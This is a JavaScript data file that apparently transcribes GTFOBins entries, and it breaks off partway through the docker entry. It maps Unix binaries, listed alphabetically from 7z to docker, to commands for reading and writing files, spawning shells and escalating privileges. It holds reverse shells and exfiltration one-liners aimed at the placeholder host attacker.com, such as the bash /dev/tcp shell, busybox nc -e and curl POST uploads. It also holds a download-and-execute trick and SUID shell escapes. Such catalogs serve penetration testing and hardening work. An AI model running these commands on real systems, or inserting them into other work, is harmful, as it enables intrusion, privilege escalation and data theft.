const GTFOBINS = {
  "7z": {
    name: "7z",
    functions: ["file-read"],
    "file-read": [{"code": "7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so"}]
  },
  "R": {
    name: "R",
    functions: ["shell"],
    "shell": [{"code": "R --no-save -e 'system(\"/bin/sh\")'"}]
  },
  "aa-exec": {
    name: "aa-exec",
    functions: ["shell"],
    "shell": [{"code": "aa-exec /bin/sh"}]
  },
  "ab": {
    name: "ab",
    functions: ["download", "upload"],
    "download": [{"code": "ab -v2 http://attacker.com/path/to/input-file"}],
    "upload": [{"code": "ab -p /path/to/input-file http://attacker.com/"}]
  },
  "acr": {
    name: "acr",
    functions: ["command"],
    "command": [{"code": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file"}]
  },
  "agetty": {
    name: "agetty",
    functions: ["shell"],
    "shell": [{"code": "agetty -l /bin/sh -o -p -a root tty"}]
  },
  "alpine": {
    name: "alpine",
    functions: ["file-read"],
    "file-read": [{"code": "alpine -F /path/to/input-file", "comment": "The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere."}]
  },
  "ansible-playbook": {
    name: "ansible-playbook",
    functions: ["shell"],
    "shell": [{"code": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file\nansible-playbook /path/to/temp-file"}]
  },
  "ansible-test": {
    name: "ansible-test",
    functions: ["shell"],
    "shell": [{"code": "ansible-test shell"}]
  },
  "aoss": {
    name: "aoss",
    functions: ["shell"],
    "shell": [{"code": "aoss /bin/sh"}]
  },
  "apache2": {
    name: "apache2",
    functions: ["file-read"],
    "file-read": [{"code": "apache2 -f /path/to/input-file", "comment": "The first line may be leaked as an error message."}, {"code": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'", "comment": "The first line may be leaked as an error message."}]
  },
  "apache2ctl": {
    name: "apache2ctl",
    functions: ["file-read"],
    "file-read": [{"code": "apache2ctl -c 'Include /path/to/input-file'", "comment": "The first line only is likely leaked as an error message."}]
  },
  "apport-cli": {
    name: "apport-cli",
    functions: ["inherit"],
    "inherit": [{"code": "apport-cli -f\n1\n2\nv", "comment": "The terminal interface expects some choices in order to spawn tha pager."}]
  },
  "apt-get": {
    name: "apt-get",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "apt-get changelog apt"}],
    "shell": [{"code": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl", "comment": "For this to work the target package (i.e., `sl`) must not be already installed."}, {"code": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh", "comment": "When the shell exits the `update` command is actually executed."}]
  },
  "aptitude": {
    name: "aptitude",
    functions: ["inherit"],
    "inherit": [{"code": "aptitude changelog aptitude"}]
  },
  "ar": {
    name: "ar",
    functions: ["file-read"],
    "file-read": [{"code": "ar r /path/to/output-file /path/to/input-file\nar p /path/to/output-file"}]
  },
  "arch-nspawn": {
    name: "arch-nspawn",
    functions: ["shell"],
    "shell": [{"code": "mkdir -p ./etc/\ngrep -oP \"^CHROOT_VERSION='\\K[^']+\" /usr/share/devtools/lib/archroot.sh >.arch-chroot\ntouch ./etc/pacman.conf\necho 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf\narch-nspawn ."}]
  },
  "aria2c": {
    name: "aria2c",
    functions: ["command", "download", "file-read"],
    "command": [{"code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain", "comment": "Note that the subprocess is immediately sent to the background."}, {"code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa", "comment": "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID."}],
    "download": [{"code": "aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file", "comment": "Use `--allow-overwrite` if needed. Similarly `-o /path/to/ouput-file` can be omitted, in that case the file is saved to `input-file` in the current working directory."}],
    "file-read": [{"code": "aria2c -i /path/to/input-file", "comment": "The file is leaked as error messages."}]
  },
  "arj": {
    name: "arj",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "arj a /path/to/output-file /path/to/input-file\narj p /path/to/output-file", "comment": "The `.arj` suffix will be added to `output-file`."}],
    "file-write": [{"code": "echo DATA >output-file\narj a x output-file\narj e x /path/to/output-dir/", "comment": "The `.arj` suffix will be added to `x`."}]
  },
  "arp": {
    name: "arp",
    functions: ["file-read"],
    "file-read": [{"code": "arp -v -f /path/to/input-file", "comment": "Lines are likely leaked as error messages."}]
  },
  "as": {
    name: "as",
    functions: ["file-read"],
    "file-read": [{"code": "as @/path/to/input-file", "comment": "Lines are likely leaked as error messages."}]
  },
  "ascii-xfr": {
    name: "ascii-xfr",
    functions: ["file-read"],
    "file-read": [{"code": "ascii-xfr -ns /path/to/input-file"}]
  },
  "ascii85": {
    name: "ascii85",
    functions: ["file-read"],
    "file-read": [{"code": "ascii85 /path/to/input-file | ascii85 --decode"}]
  },
  "ash": {
    name: "ash",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "ash -c 'echo DATA >/path/to/output-file'", "suid_code": "ash -p -c 'echo DATA >/path/to/output-file'"}],
    "shell": [{"code": "ash", "suid_code": "ash -p"}]
  },
  "aspell": {
    name: "aspell",
    functions: ["file-read"],
    "file-read": [{"code": "aspell -c /path/to/input-file", "comment": "The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words."}, {"code": "aspell --conf /path/to/input-file", "comment": "The first word is likely displayed as error messaged, and converted to lowercase."}]
  },
  "asterisk": {
    name: "asterisk",
    functions: ["shell"],
    "shell": [{"code": "asterisk -r\n!/bin/sh", "comment": "A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket."}]
  },
  "at": {
    name: "at",
    functions: ["command", "shell"],
    "command": [{"code": "echo /path/to/command | at now"}],
    "shell": [{"code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null", "comment": "`tail` is used to pause the terminal."}]
  },
  "atobm": {
    name: "atobm",
    functions: ["file-read"],
    "file-read": [{"code": "atobm /path/to/input-file", "comment": "Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F \"'\" '{printf \"%s\", $2}'`."}]
  },
  "autoconf": {
    name: "autoconf",
    functions: ["shell"],
    "shell": [{"code": "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\ntouch configure.ac\nAUTOM4TE=/path/to/temp-file autoconf"}]
  },
  "autoheader": {
    name: "autoheader",
    functions: ["shell"],
    "shell": [{"code": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\ntouch configure.ac\nAUTOM4TE=/path/to/temp-file autoheader"}]
  },
  "autoreconf": {
    name: "autoreconf",
    functions: ["shell"],
    "shell": [{"code": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\necho AC_INIT >configure.ac\nAUTOM4TE=/path/to/temp-file autoreconf", "comment": "The shell is invoked multiple times."}]
  },
  "aws": {
    name: "aws",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "aws ec2 describe-instances --filter file:///path/to/input-file"}],
    "inherit": [{"code": "aws help"}]
  },
  "base32": {
    name: "base32",
    functions: ["file-read"],
    "file-read": [{"code": "base32 /path/to/input-file | base32 --decode"}]
  },
  "base58": {
    name: "base58",
    functions: ["file-read"],
    "file-read": [{"code": "base58 /path/to/input-file | base58 --decode"}]
  },
  "base64": {
    name: "base64",
    functions: ["file-read"],
    "file-read": [{"code": "base64 /path/to/input-file | base64 --decode"}]
  },
  "basenc": {
    name: "basenc",
    functions: ["file-read"],
    "file-read": [{"code": "basenc --base64 /path/to/input-file | basenc -d --base64"}]
  },
  "basez": {
    name: "basez",
    functions: ["file-read"],
    "file-read": [{"code": "basez /path/to/input-file | basez --decode"}]
  },
  "bash": {
    name: "bash",
    functions: ["download", "file-read", "file-write", "library-load", "reverse-shell", "shell", "upload"],
    "download": [{"code": "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'", "suid_code": "bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"}, {"code": "bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'", "suid_code": "bash -p -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"}],
    "file-read": [{"code": "bash -c 'echo \"$(</path/to/input-file)\"'", "suid_code": "bash -p -c 'echo \"$(</path/to/input-file)\"'"}, {"code": "HISTTIMEFORMAT=$'\\r\\e[K'\nhistory -c\nhistory -r /path/to/input-file\nhistory", "comment": "This only works interactively from an existing `bash` session."}],
    "file-write": [{"code": "bash -c 'echo DATA >/path/to/output-file'", "suid_code": "bash -p -c 'echo DATA >/path/to/output-file'"}, {"code": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w /path/to/output-file", "comment": "This only works interactively from an existing `bash` session. It adds timestamps to the output file."}],
    "library-load": [{"code": "bash -c 'enable -f /path/to/lib.so x'", "suid_code": "bash -p -c 'enable -f /path/to/lib.so x'"}],
    "reverse-shell": [{"code": "bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'", "suid_code": "bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'"}],
    "shell": [{"code": "bash", "suid_code": "bash -p"}],
    "upload": [{"code": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "suid_code": "bash -p -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"}, {"code": "bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "suid_code": "bash -p -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"}]
  },
  "bashbug": {
    name: "bashbug",
    functions: ["inherit"],
    "inherit": [{"code": "bashbug"}]
  },
  "batcat": {
    name: "batcat",
    functions: ["inherit"],
    "inherit": [{"code": "batcat --paging always /etc/hosts", "comment": "`--paging always` can be omitted provided that the output doesn't fit the screen."}]
  },
  "bbot": {
    name: "bbot",
    functions: ["file-read"],
    "file-read": [{"code": "bbot -d -cy /path/to/input-file", "comment": "The file is displayed in the debug log."}]
  },
  "bc": {
    name: "bc",
    functions: ["file-read"],
    "file-read": [{"code": "bc -s /path/to/input-file\nquit", "comment": "The file content is actually parsed and appears as error messages."}]
  },
  "bconsole": {
    name: "bconsole",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "bconsole -c /path/to/file-input", "comment": "The file is actually parsed and the first wrong line is returned in an error message."}],
    "shell": [{"code": "bconsole\n@exec /bin/sh"}]
  },
  "bee": {
    name: "bee",
    functions: ["inherit"],
    "inherit": [{"code": "bee eval '...'", "comment": "This allows to run PHP code (`...`).\n\nThis must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option."}]
  },
  "borg": {
    name: "borg",
    functions: ["shell"],
    "shell": [{"code": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\""}]
  },
  "bpftrace": {
    name: "bpftrace",
    functions: ["shell"],
    "shell": [{"code": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'"}, {"code": "echo 'BEGIN {system(\"/bin/sh 1<&0\");exit()}' >/path/to/temp-file\nbpftrace --unsafe /path/to/temp-file"}, {"code": "bpftrace -c /bin/sh -e 'END {exit()}'"}]
  },
  "bridge": {
    name: "bridge",
    functions: ["file-read"],
    "file-read": [{"code": "bridge -b /path/to/input-file", "comment": "Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error."}]
  },
  "bundle": {
    name: "bundle",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "bundle help"}, {"code": "touch Gemfile\nbundle console"}],
    "shell": [{"code": "BUNDLE_GEMFILE=x bundle exec /bin/sh"}, {"code": "touch Gemfile\nbundle exec /bin/sh"}, {"code": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install", "comment": "This might run the shell twice, one after the other."}]
  },
  "busctl": {
    name: "busctl",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "busctl --show-machine"}],
    "shell": [{"code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'", "suid_code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"}, {"code": "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'", "suid_code": "busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"}]
  },
  "busybox": {
    name: "busybox",
    functions: ["inherit", "reverse-shell", "upload"],
    "inherit": [{"code": "busybox ash"}, {"code": "busybox cat"}],
    "reverse-shell": [{"code": "busybox nc -e /bin/sh attacker.com 12345"}],
    "upload": [{"code": "busybox httpd -f -p 12345 -h .", "comment": "This serves files in the local folder via an HTTP server."}]
  },
  "byebug": {
    name: "byebug",
    functions: ["inherit"],
    "inherit": [{"code": "byebug --no-stop /path/to/script.rb"}]
  },
  "bzip2": {
    name: "bzip2",
    functions: ["file-read"],
    "file-read": [{"code": "bzip2 -c /path/to/input-file | bzip2 -d"}]
  },
  "cabal": {
    name: "cabal",
    functions: ["shell"],
    "shell": [{"code": "cabal exec --project-file=/dev/null -- /bin/sh", "suid_code": "cabal exec --project-file=/dev/null -- /bin/sh -p"}]
  },
  "cancel": {
    name: "cancel",
    functions: ["upload"],
    "upload": [{"code": "cancel -h attacker.com:12345 -u DATA", "comment": "Data is sent as a POST request along with other content."}]
  },
  "capsh": {
    name: "capsh",
    functions: ["shell"],
    "shell": [{"code": "capsh --", "suid_code": "capsh --gid=0 --uid=0 --"}]
  },
  "cargo": {
    name: "cargo",
    functions: ["inherit"],
    "inherit": [{"code": "cargo help doc"}]
  },
  "cat": {
    name: "cat",
    functions: ["file-read"],
    "file-read": [{"code": "cat /path/to/input-file"}]
  },
  "cdist": {
    name: "cdist",
    functions: ["shell"],
    "shell": [{"code": "cdist shell -s /bin/sh"}]
  },
  "certbot": {
    name: "certbot",
    functions: ["shell"],
    "shell": [{"code": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'", "comment": "This needs a writable directory, replace `.` if needed."}]
  },
  "chattr": {
    name: "chattr",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "chattr +i /path/to/input-file", "comment": "Make the target file immutable."}]
  },
  "check_by_ssh": {
    name: "check_by_ssh",
    functions: ["shell"],
    "shell": [{"code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C x", "comment": "The shell will only last 10 seconds."}]
  },
  "check_cups": {
    name: "check_cups",
    functions: ["file-read"],
    "file-read": [{"code": "check_cups --extra-opts=@/path/to/input-file", "comment": "The read file content is limited to the first line."}]
  },
  "check_log": {
    name: "check_log",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "check_log -F /path/to/input-file -O /dev/stdout"}],
    "file-write": [{"code": "check_log -F /path/to/input-file -O /path/to/output-file"}]
  },
  "check_memory": {
    name: "check_memory",
    functions: ["file-read"],
    "file-read": [{"code": "check_memory --extra-opts=@/path/to/input-file", "comment": "The read file content is limited to the first line."}]
  },
  "check_raid": {
    name: "check_raid",
    functions: ["file-read"],
    "file-read": [{"code": "check_raid --extra-opts=@/path/to/input-file", "comment": "The read file content is limited to the first line."}]
  },
  "check_ssl_cert": {
    name: "check_ssl_cert",
    functions: ["shell"],
    "shell": [{"code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\ncheck_ssl_cert --grep-bin /path/to/temp-file -H x", "comment": "The shell will be invoked multiple times."}]
  },
  "check_statusfile": {
    name: "check_statusfile",
    functions: ["file-read"],
    "file-read": [{"code": "check_statusfile /path/to/input-file", "comment": "The read file content is limited to the first line."}]
  },
  "chmod": {
    name: "chmod",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "chmod 6777 /path/to/input-file", "comment": "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file."}]
  },
  "choom": {
    name: "choom",
    functions: ["shell"],
    "shell": [{"code": "choom -n 0 /bin/sh", "suid_code": "choom -n 0 -- /bin/sh -p"}]
  },
  "chown": {
    name: "chown",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "chown $(id -un):$(id -gn) /path/to/input-file", "comment": "This can be run with elevated privileges to change ownership and then read, write, or execute a file."}]
  },
  "chroot": {
    name: "chroot",
    functions: ["shell"],
    "shell": [{"code": "chroot /", "suid_code": "chroot / /bin/sh -p"}]
  },
  "chrt": {
    name: "chrt",
    functions: ["shell"],
    "shell": [{"code": "chrt 1 /bin/sh", "comment": "Any number between 1 and 99 will do.", "suid_code": "chrt 1 /bin/sh -p"}]
  },
  "clamscan": {
    name: "clamscan",
    functions: ["file-read"],
    "file-read": [{"code": "touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'", "comment": "Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`."}]
  },
  "clisp": {
    name: "clisp",
    functions: ["shell"],
    "shell": [{"code": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'"}]
  },
  "cmake": {
    name: "cmake",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "cmake -E cat /path/to/input-file"}],
    "shell": [{"code": "echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt\ncmake /path/to/"}]
  },
  "cmp": {
    name: "cmp",
    functions: ["file-read"],
    "file-read": [{"code": "cmp /path/to/input-file /dev/zero -b -l", "comment": "Dump the bytes of the input file that are different from the NUL byte in a tabular format."}]
  },
  "cobc": {
    name: "cobc",
    functions: ["shell"],
    "shell": [{"code": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file\ncobc -xFj --frelax-syntax-checks /path/to/temp-file", "comment": "The `/path/to/temp-file` sill be overwritten after the execution."}]
  },
  "code": {
    name: "code",
    functions: ["download", "reverse-shell", "upload"],
    "download": [{"code": "code tunnel --name xxxxxx", "comment": "This requires a valid GitHub account.\n\nRun the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel."}],
    "reverse-shell": [{"code": "code tunnel --name xxxxxx", "comment": "This requires a valid GitHub account.\n\nRun the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel."}],
    "upload": [{"code": "code tunnel --name xxxxxx", "comment": "This requires a valid GitHub account.\n\nRun the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel."}]
  },
  "codex": {
    name: "codex",
    functions: ["shell"],
    "shell": [{"code": "codex sandbox linux /bin/sh"}]
  },
  "column": {
    name: "column",
    functions: ["file-read"],
    "file-read": [{"code": "column /path/to/input-file", "comment": "This program expects textual data."}]
  },
  "comm": {
    name: "comm",
    functions: ["file-read"],
    "file-read": [{"code": "comm /path/to/input-file /dev/null", "comment": "A newline is appended to the file."}]
  },
  "composer": {
    name: "composer",
    functions: ["shell"],
    "shell": [{"code": "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json\ncomposer run-script x"}]
  },
  "cowsay": {
    name: "cowsay",
    functions: ["inherit"],
    "inherit": [{"code": "cowsay -f /path/to/script.pl x"}]
  },
  "cowthink": {
    name: "cowthink",
    functions: ["inherit"],
    "inherit": [{"code": "cowthink -f /path/to/script.pl x"}]
  },
  "cp": {
    name: "cp",
    functions: ["file-read", "file-write", "privilege-escalation"],
    "file-read": [{"code": "cp /path/to/input-file /dev/stdout"}],
    "file-write": [{"code": "echo DATA | cp /dev/stdin /path/to/output-file"}],
    "privilege-escalation": [{"code": "cp /path/to/input-file /path/to/output-file", "comment": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"}, {"code": "cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file", "comment": "This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another."}]
  },
  "cpan": {
    name: "cpan",
    functions: ["inherit"],
    "inherit": [{"code": "cpan\n! ...", "comment": "Perl code can be executed with the `!` command."}]
  },
  "cpio": {
    name: "cpio",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "echo /path/to/input-file | cpio -o", "comment": "The content of the file is printed to standard output, between the `cpio` archive format header and footer."}, {"code": "echo /path/to/input-file | cpio -dp .\ncat path/to/input-file", "comment": "The whole directory structure is copied to `.`, hence this is also a file write.", "sudo_code": "echo /path/to/input-file | cpio -R $UID -dp .\ncat path/to/input-file", "suid_code": "echo /path/to/input-file | cpio -R $UID -dp .\ncat path/to/input-file"}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -udp .", "comment": "The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.", "sudo_code": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -R 0:0 -udp .", "suid_code": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -R 0:0 -udp ."}],
    "shell": [{"code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"}]
  },
  "cpulimit": {
    name: "cpulimit",
    functions: ["shell"],
    "shell": [{"code": "cpulimit -l 100 -f -- /bin/sh", "suid_code": "cpulimit -l 100 -f -- /bin/sh -p"}]
  },
  "crash": {
    name: "crash",
    functions: ["command", "inherit"],
    "command": [{"code": "CRASHPAGER=/path/to/command crash -h"}],
    "inherit": [{"code": "crash -h"}]
  },
  "crontab": {
    name: "crontab",
    functions: ["command", "inherit"],
    "command": [{"code": "crontab -e", "comment": "This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron)."}],
    "inherit": [{"code": "crontab -e"}]
  },
  "csh": {
    name: "csh",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "csh -c 'echo DATA >/path/to/output-file'", "suid_code": "csh -c 'echo DATA >/path/to/output-file' -b"}],
    "shell": [{"code": "csh", "suid_code": "csh -b"}]
  },
  "csplit": {
    name: "csplit",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "csplit /path/to/input-file 1\ncat xx01"}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\ncsplit -z -b '%doutput-file' /path/to/temp-file 1", "comment": "Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`)."}]
  },
  "csvtool": {
    name: "csvtool",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "csvtool trim t /path/to/input-file", "comment": "The file is actually parsed and manipulated as CSV."}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\ncsvtool trim t /path/to/temp-file -o /path/to/output-file", "comment": "The file is actually parsed and manipulated as CSV."}],
    "shell": [{"code": "csvtool call '/bin/sh;false' /etc/hosts"}]
  },
  "ctr": {
    name: "ctr",
    functions: ["shell"],
    "shell": [{"code": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x", "comment": "An image must be already present, for example:\n\n```\nctr images pull docker.io/library/alpine:latest\n```"}]
  },
  "cupsfilter": {
    name: "cupsfilter",
    functions: ["file-read"],
    "file-read": [{"code": "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file"}]
  },
  "curl": {
    name: "curl",
    functions: ["download", "file-read", "file-write", "library-load", "upload"],
    "download": [{"code": "curl http://attacker.com/path/to/input-file -o /path/to/output-file"}],
    "file-read": [{"code": "curl file:///path/to/input-file"}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\ncurl file:///path/to/temp-file -o /path/to/output-file"}],
    "library-load": [{"code": "curl --engine /path/to/lib.so x"}],
    "upload": [{"code": "curl -X POST --data-binary @/path/to/input-file http://attacker.com"}, {"code": "curl -X POST --data-binary DATA http://attacker.com"}, {"code": "curl gopher://attacker.com:12345/_DATA", "comment": "Data will be `\\r\\n` terminated."}]
  },
  "cut": {
    name: "cut",
    functions: ["file-read"],
    "file-read": [{"code": "cut -d '' -f1 /path/to/input-file"}]
  },
  "dash": {
    name: "dash",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "dash -c 'echo DATA >/path/to/output-file'"}],
    "shell": [{"code": "dash"}]
  },
  "date": {
    name: "date",
    functions: ["file-read"],
    "file-read": [{"code": "date -f /path/to/input-file", "comment": "Each line is corrupted by a prefix string and wrapped inside quotes."}]
  },
  "dc": {
    name: "dc",
    functions: ["shell"],
    "shell": [{"code": "dc -e '!/bin/sh'"}]
  },
  "dd": {
    name: "dd",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "dd if=/path/to/input-file"}],
    "file-write": [{"code": "echo DATA | dd of=/path/to/output-file"}]
  },
  "debugfs": {
    name: "debugfs",
    functions: ["shell"],
    "shell": [{"code": "debugfs\n!/bin/sh"}]
  },
  "dhclient": {
    name: "dhclient",
    functions: ["shell"],
    "shell": [{"code": "dhclient -sf /bin/sh"}]
  },
  "dialog": {
    name: "dialog",
    functions: ["file-read"],
    "file-read": [{"code": "dialog --textbox /path/to/input-file 0 0", "comment": "The file is shown in an interactive TUI dialog."}]
  },
  "diff": {
    name: "diff",
    functions: ["file-read"],
    "file-read": [{"code": "diff --line-format=%L /dev/null /path/to/input-file"}, {"code": "diff --recursive /path/to/empty-dir /path/to/input-dir/", "comment": "This lists the content of a directory. `/path/to/empty-dir` can be any directory, but for convenience it is better to use an empty directory to avoid noise output."}]
  },
  "dig": {
    name: "dig",
    functions: ["file-read"],
    "file-read": [{"code": "dig -f /path/to/input-file", "comment": "Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation."}]
  },
  "distcc": {
    name: "distcc",
    functions: ["shell"],
    "shell": [{"code": "distcc /bin/sh", "suid_code": "distcc /bin/sh -p"}]
  },
  "dmesg": {
    name: "dmesg",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "dmesg -rF /path/to/input-file"}],
    "inherit": [{"code": "dmesg -H"}]
  },
  "dmidecode": {
    name: "dmidecode",
    functions: ["file-write"],
    "file-write": [{"code": "dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file", "comment": "It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n```\nmake dmiwrite\necho DATA >/path/to/temp-file\n./dmiwrite /path/to/temp-file x.dmi\n```"}]
  },
  "dmsetup": {
    name: "dmsetup",
    functions: ["shell"],
    "shell": [{"code": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'", "suid_code": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -p -s'"}]
  },
  "dnf": {
    name: "dnf",
    functions: ["command"],
    "command": [{"code": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*", "comment": "Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command >x.sh\nfpm -n x -s dir -t rpm -a all --before-install x.sh .\n```\n\nThe `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise."}]
  },
  "dnsmasq": {
    name: "dnsmasq",
    functions: ["command"],
    "command": [{"code": "dnsmasq --conf-script='/path/to/command 1>&2'"}]
  },
  "doas": {
    name: "doas",
    functions: ["shell"],
    "shell": [{"code": "doas -u root /bin/sh", "comment": "The user must be allowed to use `doas`."}]
  },
  "docker": {
    name: "docker",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "docker cp /path/to/input-file $CONTAINER_ID:input-file\ndocker cp $CONTAINER_ID:input-file /path/to/temp-file\ncat /path/to/temp-file", "comment": "Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host."}],
